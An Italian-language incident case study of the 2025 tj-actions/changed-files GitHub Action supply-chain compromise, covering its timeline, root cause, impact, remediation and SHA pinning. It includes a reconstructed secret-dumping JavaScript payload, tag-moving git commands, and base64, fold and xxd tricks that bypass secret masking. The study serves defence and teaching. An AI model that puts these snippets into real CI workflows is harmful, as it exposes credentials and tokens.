# Case Study — `tj-actions/changed-files` Compromise (2025-03)

> **Aggiornamento:** 2026-05-22
> **CVE:** CVE-2025-30066
> **GHSA:** GHSA-mwg3-gf2q-mhjp
> **Tipo:** supply-chain attack — GitHub Actions tag hijacking
> **Severità:** CRITICA (CVSS 8.6)
> **Durata compromissione:** ~14 marzo 2025 – ~15 marzo 2025 (~1 giorno)

---

## Sommario esecutivo

Il 14 marzo 2025, un attaccante ha compromesso l'account di un maintainer della GitHub
Action `tj-actions/changed-files`, una delle action più popolari dell'ecosistema con
oltre 23.000 repository dipendenti. L'attaccante ha iniettato codice malevolo nel
repository e ha spostato i tag Git esistenti (v1, v35, v44, ecc.) per puntare al
commit compromesso.

Il codice malevolo stampava tutti i secret del runner CI nei log del workflow. Per i
repository pubblici, questi log sono accessibili a chiunque, esponendo direttamente
chiavi AWS, token GitHub, credenziali npm e qualsiasi altro secret configurato.

L'incidente è stato rilevato in meno di 24 ore grazie a StepSecurity, un'azienda
specializzata in CI/CD security, ma ha comunque impattato un numero significativo di
repository. Rappresenta il caso più chiaro di "tag hijacking" su larga scala nelle
GitHub Actions e ha definitivamente consolidato il SHA pinning come pratica obbligatoria.

---

## Timeline dettagliata dell'incidente

### Fase 1 — Compromissione dell'account maintainer

| Data/Ora (UTC stima) | Evento |
|----------------------|--------|
| **2025-03-14, ore mattutine** | L'attaccante ottiene accesso all'account GitHub di un maintainer di `tj-actions/changed-files`. Il vettore esatto di compromissione dell'account non è stato divulgato pubblicamente — le ipotesi includono credential stuffing, token PAT rubato, o compromissione di un'altra GitHub Action della stessa organizzazione (`reviewdog/action-setup`). |
| **2025-03-14** | L'attaccante crea un commit malevolo nel repository `tj-actions/changed-files`. Il commit modifica l'action per includere codice di exfiltration dei secret. |

### Fase 2 — Tag hijacking e propagazione

| Data/Ora (UTC stima) | Evento |
|----------------------|--------|
| **2025-03-14** | L'attaccante esegue tag hijacking: sposta i tag Git mutabili (`v1`, `v35`, `v44`, e altri) per puntare al commit malevolo. Questo significa che qualsiasi workflow che referenzia `tj-actions/changed-files@v35` o `@v44` inizia a scaricare ed eseguire il codice compromesso. |
| **2025-03-14** | I workflow CI di repository pubblici e privati iniziano a eseguire il codice malevolo. Per i repository pubblici, i log del workflow — che ora contengono i secret in chiaro — sono visibili a chiunque. |

### Fase 3 — Rilevamento e risposta

| Data/Ora (UTC stima) | Evento |
|----------------------|--------|
| **2025-03-15** | StepSecurity rileva l'anomalia tramite i propri strumenti di monitoring della supply chain CI/CD e pubblica un advisory. |
| **2025-03-15** | La community GitHub reagisce rapidamente. L'action viene flaggata. GitHub interviene. |
| **2025-03-15** | Il maintainer legittimo riprende il controllo dell'account e rimuove il commit malevolo. I tag vengono ripristinati a puntare ai commit legittimi. |
| **2025-03-15** | GitHub assegna CVE-2025-30066 e pubblica un security advisory (GHSA-mwg3-gf2q-mhjp). |
| **2025-03-15 – 2025-03-17** | Campagna di notifica massiva. Le organizzazioni che usano l'action iniziano la rotazione dei secret. |
| **2025-03-17** | StepSecurity pubblica un'analisi tecnica dettagliata con IoC e raccomandazioni. |

---

## Analisi tecnica approfondita

### Il payload malevolo

Il codice iniettato dall'attaccante era progettato per esfiltrare i secret del runner CI.
Il meccanismo era brutale nella sua semplicità: stampare i secret nei log del workflow.

Ricostruzione semplificata del payload:

```javascript
// Codice malevolo iniettato nell'action (ricostruzione)
const { execSync } = require('child_process');

// Dump di tutte le variabili d'ambiente nei log del workflow
// Per repo pubblici, questi log sono accessibili a chiunque
const env = execSync('env').toString();

// I secret di GitHub Actions sono normalmente mascherati nei log
// ma il codice usava tecniche per bypassare il masking:
// - encoding base64
// - splitting dei valori
// - double-encoding
const secrets = Buffer.from(env).toString('base64');
console.log(secrets);
```

Il punto critico: GitHub Actions maschera automaticamente i valori dei secret nei log
(`***`), ma il codice malevolo usava tecniche di encoding per bypassare il masking.

### Anatomia del tag hijacking in Git

Git supporta due tipi di riferimenti per i tag:

```text
Tag leggero (lightweight):  puntatore diretto a un commit
Tag annotato (annotated):   oggetto Git con metadata (autore, data, messaggio)
```

In entrambi i casi, un tag è mutabile — chi ha push access può spostarlo:

```bash
# Come l'attaccante ha spostato i tag
# (richiede push access al repository)

# Eliminare il tag remoto esistente
git push origin :refs/tags/v35

# Creare un nuovo tag con lo stesso nome sul commit malevolo
git tag v35 <commit-malevolo>
git push origin v35

# Risultato: tutti i workflow che usano @v35 ora scaricano il commit malevolo
```

Questo è il motivo per cui il SHA pinning è l'unica difesa affidabile:

```yaml
# Tag mutabile — l'attaccante può spostarlo
- uses: tj-actions/changed-files@v35  # PERICOLOSO

# SHA immutabile — punta a un commit specifico, non spostabile
- uses: tj-actions/changed-files@a92ddff67cc6ba3e5dccf48e1f4b71d9d5b6e6d3  # v35.9.2
```

### Perché 23.000+ repository erano vulnerabili

```text
Repository che usano l'action con tag mutabile (@v35, @v44, @v1):
  → Compromessi automaticamente quando il tag viene spostato.
  → Nessuna azione richiesta dall'attaccante dopo il tag hijacking.
  → Il workflow scarica silenziosamente il nuovo codice.

Repository che usano l'action con SHA pin:
  → NON compromessi.
  → Il SHA punta al commit originale legittimo.
  → L'attaccante non può modificare un commit esistente.
```

### Il meccanismo di masking dei secret in GitHub Actions

GitHub Actions maschera automaticamente i valori dei secret nei log:

```yaml
steps:
  - run: echo "${{ secrets.MY_SECRET }}"
  # Output nel log: "***" (mascherato)
```

Ma il masking ha limitazioni note:

```yaml
steps:
  - run: |
      # Il masking si basa su matching esatto del valore
      # Queste tecniche possono bypassarlo:

      # 1. Base64 encoding
      echo "${{ secrets.MY_SECRET }}" | base64
      # Output: dW5tYXNrZWQgc2VjcmV0  (NON mascherato)

      # 2. Splitting carattere per carattere
      echo "${{ secrets.MY_SECRET }}" | fold -w1
      # Output: ogni carattere su una riga separata (NON mascherato)

      # 3. Hex encoding
      echo "${{ secrets.MY_SECRET }}" | xxd -p
      # Output: hex dump (NON mascherato)
```

### Catena di compromissione collegata: reviewdog

L'analisi post-incidente ha rivelato che l'attacco potrebbe essere iniziato con la
compromissione di un'altra GitHub Action, `reviewdog/action-setup`, che era usata
come dipendenza nei workflow CI di `tj-actions` stesso. Questo ha creato una catena:

```text
1. Compromissione di reviewdog/action-setup
       ↓
2. Il CI di tj-actions esegue reviewdog compromesso
       ↓
3. L'attaccante ottiene token/credenziali dal CI di tj-actions
       ↓
4. L'attaccante usa le credenziali per accedere al repo tj-actions
       ↓
5. Tag hijacking di tj-actions/changed-files
       ↓
6. 23.000+ repository impattati
```

Questo illustra il rischio di supply chain transitiva: la sicurezza di un'action dipende
dalla sicurezza di tutte le sue dipendenze upstream.

---

## Root cause analysis

### Causa primaria

Compromissione dell'account maintainer di una GitHub Action ad alta diffusione,
combinata con la mutabilità dei tag Git come meccanismo di riferimento.

### Cause contribuenti

| Causa | Dettaglio |
|-------|-----------|
| **Tag Git mutabili usati come default** | La documentazione di GitHub Actions e delle action di terze parti storicamente raccomandava `@v1` o `@v35`, normalizzando l'uso di riferimenti mutabili. |
| **Single maintainer come SPOF** | L'action era mantenuta da un singolo individuo — compromettere un solo account bastava per impattare 23.000+ repository. |
| **Masking bypassabile** | Il masking dei secret nei log di GitHub Actions è una difesa fragile, bypassabile con encoding. |
| **Assenza di attestation sulla provenienza** | Non esisteva un meccanismo per verificare che il codice eseguito dall'action corrispondesse a una release firmata. |
| **Supply chain transitiva** | La possibile compromissione via `reviewdog/action-setup` dimostra che la sicurezza è una catena dove il link più debole determina la resistenza. |

---

## Valutazione dell'impatto

### Impatto diretto

| Metrica | Valore |
|---------|--------|
| **Repository dipendenti** | 23.000+ (secondo i dati GitHub al momento dell'incidente) |
| **Durata esposizione** | ~24 ore |
| **Tipo di dati esposti** | Secret CI/CD: token GitHub, chiavi AWS, token npm, credenziali database, chiavi API |
| **Repository pubblici impattati** | Secret visibili nei log pubblici del workflow |

### Organizzazioni potenzialmente impattate

Qualsiasi organizzazione che:
1. Usava `tj-actions/changed-files` con tag mutabile (`@v35`, `@v44`, `@v1`)
2. Ha eseguito un workflow durante il periodo di compromissione (~14-15 marzo 2025)
3. Aveva secret configurati nel repository o nell'organizzazione

### Valutazione del blast radius

```text
Per repository PUBBLICI:
  → Secret stampati nei log → visibili a CHIUNQUE
  → Compromissione immediata e totale dei secret esposti
  → Nessuna azione aggiuntiva necessaria dall'attaccante per raccogliere i dati

Per repository PRIVATI:
  → Secret stampati nei log → visibili ai collaboratori del repository
  → Rischio più contenuto ma comunque significativo
  → L'attaccante necessita accesso ai log per raccogliere i dati
```

---

## Remediation — Azioni correttive

### Risposta immediata (ore)

```bash
# 1. Identificare se il proprio repository è impattato
# Cercare uso di tj-actions/changed-files con tag mutabile
grep -rn "tj-actions/changed-files@v" .github/workflows/

# 2. Verificare se workflow sono stati eseguiti durante il periodo compromesso
gh run list --workflow=ci.yml --created=">2025-03-14" --json conclusion,createdAt

# 3. Se impattato: ROTAZIONE IMMEDIATA di TUTTI i secret
# Non solo quelli "probabilmente usati" — TUTTI i secret del repository/org
gh secret list
# Per ogni secret: rigenerare alla sorgente, aggiornare in GitHub
gh secret set MY_SECRET --body "nuovo-valore-rigenerato"

# 4. Revocare tutti i token personali che potrebbero essere stati esposti
gh auth status
# Rigenerare il PAT su https://github.com/settings/tokens

# 5. Controllare i log per segni di exfiltration
gh run view <run-id> --log | grep -i "base64\|encode\|env"
```

### Mitigazione tecnica (giorni)

**Convertire tutti i riferimenti ad action da tag a SHA:**

```yaml
# PRIMA — vulnerabile a tag hijacking
- uses: tj-actions/changed-files@v35
- uses: actions/checkout@v4
- uses: actions/setup-node@v4

# DOPO — immutabile, resistente a tag hijacking
- uses: tj-actions/changed-files@a92ddff67cc6ba3e5dccf48e1f4b71d9d5b6e6d3 # v35.9.2
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
- uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af # v4.1.0
```

**Implementare permessi minimi in ogni workflow:**

```yaml
# Top-level: nessun permesso di default
permissions: {}

jobs:
  build:
    runs-on: ubuntu-latest
    # Job-level: solo i permessi necessari
    permissions:
      contents: read
      pull-requests: read
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      # ...
```

**Configurare Renovate/Dependabot per SHA pinning automatico:**

```json
// renovate.json — auto-update SHA con commento tag
{
  "extends": ["config:base"],
  "github-actions": {
    "enabled": true,
    "pinDigests": true
  }
}
```

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
```

### Hardening del workflow (settimane)

**Implementare StepSecurity Harden-Runner:**

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Harden runner
        uses: step-security/harden-runner@91182cccc01eb5e619899d80e4e971d6181294a7 # v2.10.1
        with:
          egress-policy: audit  # o 'block' per enforcement
          allowed-endpoints: >
            api.github.com:443
            github.com:443
            registry.npmjs.org:443

      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      # ...
```

**Implementare CODEOWNERS per proteggere i workflow:**

```text
# .github/CODEOWNERS
# Solo il team security può modificare i workflow
.github/workflows/ @org/security-team
.github/actions/   @org/security-team
```

**Audit dei log per secret leaking:**

```bash
# Script per verificare se i log contengono pattern sospetti
# Eseguire per ogni workflow run nel periodo compromesso
for run_id in $(gh run list --created=">2025-03-14" --json databaseId -q '.[].databaseId'); do
  echo "Checking run $run_id..."
  gh run view "$run_id" --log 2>/dev/null | \
    grep -c "base64\|env.*dump\|secret.*print" || true
done
```

---

## Risposta dell'industria

### Reazioni immediate

- **GitHub** ha pubblicato un security advisory (GHSA-mwg3-gf2q-mhjp) e raccomandato
  il SHA pinning per tutte le action di terze parti.
- **StepSecurity** ha rilasciato tooling aggiuntivo per rilevare action compromesse
  e ha pubblicato un'analisi dettagliata della catena d'attacco.
- **La community open source** ha avviato discussioni sull'introduzione di firma
  crittografica obbligatoria per le GitHub Actions releases.

### Discussione sulla sicurezza del modello GitHub Actions

L'incidente ha riaperto il dibattito su problemi strutturali:

| Problema | Stato |
|----------|-------|
| **Tag mutabili come default** | GitHub non ha cambiato il comportamento di default; il SHA pinning rimane opt-in e la documentazione di molte action continua a mostrare tag mutabili. |
| **Single-maintainer action** | Nessun meccanismo di governance per action ad alta diffusione. Un singolo account compromesso può impattare migliaia di repository. |
| **Masking fragile** | Il masking dei secret rimane basato su pattern matching e bypassabile con encoding. |
| **Immutable action releases** | Proposta di release immutabili (simili a package registries) ancora in discussione. |
| **OIDC per le action** | Movimento verso credenziali temporanee via OIDC anziché secret statici. |

### Confronto con l'incidente `event-stream` (2018)

```text
event-stream (2018):
- Pacchetto npm, maintainer cede accesso a sconosciuto
- Codice malevolo targettizza specificamente una wallet app (copay)
- Impatto selettivo, detection dopo settimane

tj-actions (2025):
- GitHub Action, account maintainer compromesso
- Codice malevolo targettizza TUTTI gli utenti dell'action
- Impatto indiscriminato, detection in <24 ore
- Meccanismo diverso (tag hijacking vs versione npm)
```

---

## Lezioni apprese

### 1. I tag Git sono promesse, non garanzie

Un tag come `v35` è un riferimento mutabile. Chi ha push access può spostarlo in
qualsiasi momento. L'unico riferimento immutabile in Git è il SHA del commit.

### 2. Il SHA pinning è l'unica difesa contro il tag hijacking

```yaml
# Questa riga è immune al tag hijacking:
- uses: action@a92ddff67cc6ba3e5dccf48e1f4b71d9d5b6e6d3  # v35.9.2
# Il commento (#v35.9.2) è per la leggibilità umana
# Il runtime usa SOLO il SHA
```

### 3. La supply chain è transitiva

La sicurezza di un'action dipende dalla sicurezza di tutte le sue dipendenze upstream.
L'attacco è probabilmente iniziato da `reviewdog/action-setup`, non da `tj-actions`
direttamente.

### 4. `permissions: {}` è la prima linea di difesa

Anche se un'action è compromessa, con `permissions: {}` il `GITHUB_TOKEN` non ha
capacità. L'action può comunque accedere ad altri secret, ma il danno è limitato.

### 5. Le action ad alta diffusione necessitano governance

Un'action usata da 23.000+ repository mantenuta da un singolo individuo è un rischio
sistemico. Serve un modello di governance multi-maintainer per action critiche.

### 6. Il monitoring della supply chain è un investimento necessario

StepSecurity ha rilevato l'anomalia in meno di 24 ore. Senza monitoring attivo, la
compromissione sarebbe potuta durare molto più a lungo.

---

## Checklist di prevenzione

### Per ogni repository

- [ ] Tutte le GitHub Actions pinnate con SHA completo (`@sha256hash`)
- [ ] Commento con versione leggibile dopo il SHA (`# v4.2.1`)
- [ ] `permissions: {}` a livello di workflow o permessi minimi per job
- [ ] Renovate o Dependabot configurato per auto-update SHA
- [ ] `CODEOWNERS` per i file in `.github/workflows/`
- [ ] StepSecurity Harden-Runner o equivalente configurato
- [ ] Audit periodico delle action di terze parti utilizzate

### Per organizzazioni

- [ ] Policy di sicurezza che richiede SHA pinning per tutte le action
- [ ] Lista approvata di action di terze parti verificate
- [ ] Monitoring centralizzato dei workflow CI/CD
- [ ] Piano di rotazione secret pre-documentato
- [ ] Drill periodico di simulazione "action compromessa"

### Per maintainer di GitHub Actions

- [ ] 2FA abilitato sull'account GitHub
- [ ] Token PAT con scoping minimo e rotazione periodica
- [ ] Branch protection con review obbligatoria per release
- [ ] Firma crittografica delle release (GPG o Sigstore)
- [ ] Supply chain delle dipendenze dell'action stessa verificata

---

## Comandi pratici

### Trovare tutte le action non pinnate nei propri workflow

```bash
# Cercare action con tag mutabile (es. @v4) invece di SHA
grep -rn "uses:.*@v[0-9]" .github/workflows/ | \
  grep -v "@[a-f0-9]\{40\}"

# Output di esempio:
# .github/workflows/ci.yml:15:      - uses: actions/checkout@v4
# .github/workflows/ci.yml:18:      - uses: tj-actions/changed-files@v35
```

### Convertire un tag in SHA

```bash
# Trovare il SHA di un tag specifico
git ls-remote https://github.com/actions/checkout refs/tags/v4.2.2
# Output: 11bd71901bbe5b1630ceea73d27597364c9af683  refs/tags/v4.2.2

# Oppure via gh CLI
gh api repos/actions/checkout/git/refs/tags/v4.2.2 --jq '.object.sha'
```

### Verificare se i workflow sono stati eseguiti durante l'incidente

```bash
# Listare workflow run tra il 14 e 16 marzo 2025
gh run list \
  --created="2025-03-14..2025-03-16" \
  --json databaseId,workflowName,conclusion,createdAt \
  --jq '.[] | "\(.databaseId) \(.workflowName) \(.conclusion) \(.createdAt)"'
```

---

## Riferimenti

1. GitHub Security Advisory GHSA-mwg3-gf2q-mhjp:
   `https://github.com/advisories/GHSA-mwg3-gf2q-mhjp`
2. StepSecurity disclosure e analisi tecnica:
   `https://www.stepsecurity.io/blog/`
3. CVE-2025-30066 — NVD:
   `https://nvd.nist.gov/vuln/detail/CVE-2025-30066`
4. GitHub — Security hardening for GitHub Actions:
   `https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments`
5. Wiz Research — analisi della catena reviewdog → tj-actions:
   `https://www.wiz.io/blog/`
6. StepSecurity Harden-Runner:
   `https://github.com/step-security/harden-runner`

---

## Cross-links

- Modulo 19 — `../19-github-actions-ci-cd-ricette.md`.
- Modulo 27 — `../27-supply-chain-attestation-slsa.md`.
- Case Study correlato — `./codecov-bash-2021.md`.
